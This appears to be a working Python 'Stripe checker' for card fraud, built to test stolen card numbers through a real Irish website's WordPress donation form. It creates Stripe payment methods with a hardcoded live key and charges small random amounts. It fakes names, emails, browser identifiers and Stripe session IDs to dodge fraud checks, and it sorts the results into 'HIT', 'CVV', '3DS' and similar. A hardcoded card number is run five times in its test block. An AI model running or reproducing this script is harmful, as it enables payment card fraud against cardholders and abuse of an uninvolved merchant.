import requests
import json
import time
import random
import uuid
from datetime import datetime
from faker import Faker

fake = Faker("en_US")

# ========== CLASSIFICATION KEYS ==========
success_keys = ["appreciate", "appreciated", "Payment Success", "redirect_to", "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!"]
ccn_keys = ["security code is incorrect", "INCORRECT_CVV"]
invalid_keys = ["Invalid account"]
declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "cannot process your order"]
cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor"]
insufficient_keys = ["Your card has insufficient funds.", "INSUFFICIENT_FUNDS", "insufficient_funds", "Insufficient Funds", "Insufficient"]
payment_failed_keys = ["does not match the billing address"]
expired_keys = ["card has expired", "expired card", "card is expired", "expired"]
incorrect_keys = ["card number is incorrect"]
manycc_keys = ["Too Many Requests"]
riskcc_keys = ["again in a little bit"]
otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "CompletePaymentChallenge", "requires_action", "additional action before completion!", "nextAction"]
cap_keys = ["reCaptcha"]
exceed_keys = ["exceeding its amount limit"]
proxyfailed_keys = ["Failed to perform"]

def get_random_amount():
    """Generate random amount between 0.5 and 4.0 USD"""
    amount = round(random.uniform(0.5, 4.0), 2)
    return str(amount)

def is_card_expired(month, year):
    """Check if card expiry date has passed"""
    try:
        current_date = datetime.now()
        current_year = current_date.year
        current_month = current_date.month
        
        # Convert year (YY format like 26 -> 2026)
        if len(year) == 2:
            full_year = 2000 + int(year)
        else:
            full_year = int(year)
        
        # Convert month to int
        exp_month = int(month)
        
        # Check if expired
        if full_year < current_year:
            return True
        elif full_year == current_year and exp_month < current_month:
            return True
        else:
            return False
    except:
        return False

def classify_response(last, month=None, year=None):
    # First check: Card Expiry Date
    if month and year and is_card_expired(month, year):
        return "EXPIRED", "CARD EXPIRED"
    
    last_lower = last.lower()
    
    if any(key.lower() in last_lower for key in success_keys): 
        return "HIT", "HIT"
    if any(key.lower() in last_lower for key in ccn_keys): 
        return "CCN", "CCN"
    if any(key.lower() in last_lower for key in cvv_keys): 
        return "CVV", "CVV"
    if any(key.lower() in last_lower for key in otp_keys): 
        return "3DS", "3DS"
    if any(key.lower() in last_lower for key in insufficient_keys): 
        return "INSUFFICIENT", "LOW_FUND"
    if any(key.lower() in last_lower for key in expired_keys): 
        return "EXPIRED", "CARD EXPIRED"
    if any(key.lower() in last_lower for key in declined_keys): 
        return "DEAD", "DECLINED"
    
    return "DEAD", last

# ========== HELPER FUNCTIONS ==========
def gen_random_user_agent():
    chrome_version = random.randint(120, 137)
    user_agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36 Edg/{chrome_version}.0.0.0",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
        f"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
    ]
    return random.choice(user_agents)

def gen_random_name():
    first_name = fake.first_name()
    last_name = fake.last_name()
    return first_name, last_name

def gen_random_email(first_name, last_name):
    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@protonmail.com"]
    random_num = random.randint(1000, 99999)
    email = f"{first_name.lower()}{random_num}{random.choice(domains)}"
    return email

def gen_random_guid():
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"

# ========== MAIN TELE FUNCTION FOR torr.ie ==========
def Tele(ccx: str, gate_type: str = "ch1"):
    """
    Check credit card via torr.ie
    Input: "card_number|month|year|cvv"
    Returns: STRING ONLY (response_message) - Compatible with Bot.py
    """
    
    # Parse card details
    ccx = ccx.strip()
    parts = ccx.split("|")
    
    if len(parts) != 4:
        return "ERROR: Invalid format. Use: number|month|year|cvv"
    
    n, mm, yy, cvc = parts
    
    # Check expiry BEFORE making any request
    if is_card_expired(mm, yy):
        return f"📅 CARD EXPIRED ({mm}/{yy})"
    
    # Fix year format (2026 -> 26)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:4]
    
    # ========== RANDOM AMOUNT between $0.5 and $4.0 ==========
    charge_amount = get_random_amount()
    
    # Generate random customer data
    first_name, last_name = gen_random_name()
    email = gen_random_email(first_name, last_name)
    full_name = f"{first_name} {last_name}"
    
    # Generate random IDs for Stripe
    guid = gen_random_guid()
    muid = gen_random_guid()
    sid = gen_random_guid()
    client_session_id = gen_random_guid()
    
    # Stripe publishable key for torr.ie
    stripe_key = "pk_live_51JVKouAs6DndN9b8mx4e9zfXHN3jWXh6L0V2n3xk59hs90Nqy9RuqM2nqdjQkKPOB5DwBgoe9poeThAhanhLNPi900zHJa87Tz"
    
    # Create session with cookies
    session = requests.Session()
    
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    session.cookies.set('_ga', f'GA1.1.{random.randint(1000000, 9999999)}.{int(time.time())}')
    session.cookies.set('_gcl_au', f'1.1.{random.randint(100000000, 999999999)}.{int(time.time())}')
    
    # ========== STEP 1: Create Payment Method with Stripe API ==========
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    
    stripe_data = (
        f'type=card'
        f'&billing_details[name]={full_name.replace(" ", "+")}'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2F922d612e68%3B+stripe-js-v3%2F922d612e68%3B+card-element'
        f'&referrer=https%3A%2F%2Ftorr.ie'
        f'&time_on_page={random.randint(10000, 50000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&key={stripe_key}'
    )
    
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': gen_random_user_agent(),
    }
    
    try:
        response = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
    except requests.exceptions.RequestException as e:
        return f"NETWORK_ERROR: {str(e)}"
    
    if response.status_code != 200:
        return f"STRIPE_ERROR: {response.text[:200]}"
    
    try:
        response_json = response.json()
        if 'id' not in response_json:
            return f"NO_PAYMENT_METHOD_ID: {response.text[:200]}"
        payment_method_id = response_json['id']
    except Exception as e:
        return f"JSON_PARSE_ERROR: {str(e)}"
    
    # ========== STEP 2: Charge via WordPress Admin AJAX ==========
    url_wp = "https://torr.ie/wp-admin/admin-ajax.php"
    
    wp_data = {
        'action': 'wp_full_stripe_inline_payment_charge',
        'wpfs-form-name': 'default',
        'wpfs-form-get-parameters': '{}',
        'wpfs-custom-amount-unique': charge_amount,
        'wpfs-custom-input[]': str(random.randint(10000, 99999)),
        'wpfs-card-holder-email': email,
        'wpfs-card-holder-name': full_name,
        'wpfs-stripe-payment-method-id': payment_method_id,
    }
    
    headers_wp = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://torr.ie',
        'Referer': 'https://torr.ie/payments/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': gen_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    try:
        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
    except requests.exceptions.RequestException as e:
        return f"WP_NETWORK_ERROR: {str(e)}"
    
    # Parse response
    try:
        response_json = r2.json()
        message = response_json.get('message', r2.text)
        
        # Classify the response (pass month/year for expiry check)
        status, detail = classify_response(message, mm, yy)
        
        if status == "HIT":
            return f"✅ APPROVED - ${charge_amount} - {message}"
        elif status == "CCN":
            return f"❌ CCN - Wrong card number"
        elif status == "CVV":
            return f"⚠️ CVV - Wrong CVV"
        elif status == "3DS":
            return f"🔐 3DS REQUIRED - {message}"
        elif status == "INSUFFICIENT":
            return f"💰 INSUFFICIENT FUNDS (Tried ${charge_amount})"
        elif status == "EXPIRED":
            return f"📅 CARD EXPIRED ({mm}/{yy})"
        else:
            return f"❌ {message}"
            
    except:
        return r2.text


# ========== TEST FUNCTION ==========
if __name__ == "__main__":
    print("=" * 50)
    print("Torr.ie Stripe Checker with Random Amount ($0.5 - $4.0)")
    print("=" * 50)
    
    # Test card
    test_card = "4815821145363426|09|29|767"
    
    print(f"\n[+] Testing: {test_card}")
    print("-" * 50)
    
    for i in range(5):
        result = Tele(test_card)
        print(f"Test {i+1}: {result}")
        time.sleep(1)
    
    print("=" * 50)
